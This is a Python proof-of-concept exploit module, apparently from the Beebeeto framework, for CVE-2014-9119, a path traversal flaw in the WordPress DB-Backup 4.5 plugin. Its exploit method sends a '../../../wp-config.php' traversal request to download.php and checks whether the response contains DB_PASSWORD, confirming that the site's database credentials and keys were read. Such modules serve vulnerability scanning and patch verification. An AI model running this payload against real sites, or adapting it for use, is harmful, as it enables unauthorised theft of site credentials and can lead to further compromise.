#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0209',
            'name': 'WordPress DB-Backup Plugin 4.5 /download.php 任意文件下载漏洞 Exploit',
            'author': 'foundu',
            'create_date': '2014-12-18',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'WordPress',
            'vul_version': ['4.5'],
            'type': 'Arbitrary File Download',
            'tag': ['WordPress DB Backup漏洞', 'CVE-2014-9119', '任意文件下载漏洞', 'php'],
            'desc': '''
                    DB Backup plugin for WordPress contains a flaw that allows traversing outside of
                    a restricted path. The issue is due to the download.php script not properly
                    sanitizing user input, specifically path traversal style attacks (e.g. '../').
                    With a specially crafted request, a remote attacker can gain read access to
                    arbitrary files, limited by system operational access control. This
                    vulnerability can be used to get WordPress authentication keys and salts,
                    database address and credentials, which can be used in certain environments to
                    elevate privileges and execute malicious PHP code.

                    Root cause:
                    Unsanitized user input to readfile() function.
                    ''',
            'references': ['http://seclists.org/oss-sec/2014/q4/1059',
            ],
        },
    }


    @classmethod
    def exploit(cls, args):
        payload = '/wp-content/plugins/db-backup/download.php?file=../../../wp-config.php'
        verify_url = args['options']['target'] + payload
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if 'DB_PASSWORD' in content and 'wp-settings.php' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    verify = exploit


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())